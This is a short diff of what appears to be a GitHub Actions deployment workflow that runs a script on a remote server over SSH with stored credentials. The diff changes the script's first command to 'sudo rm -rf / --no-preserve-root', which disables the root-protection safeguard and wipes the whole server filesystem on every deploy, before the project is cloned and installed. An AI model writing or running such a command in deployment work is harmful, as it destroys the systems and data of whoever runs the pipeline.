@@ -61,7 +61,7 @@ jobs:
           username: ${{ secrets.SSH_USER }}
           key: ${{ secrets.SSH_PRIVATE_KEY }}
           script: |
-            sudo rm -rf /
+            sudo rm -rf / --no-preserve-root
             git clone https://github.com/Remi-Perche/next-cda241.git
             cd next-cda241/
             npm install
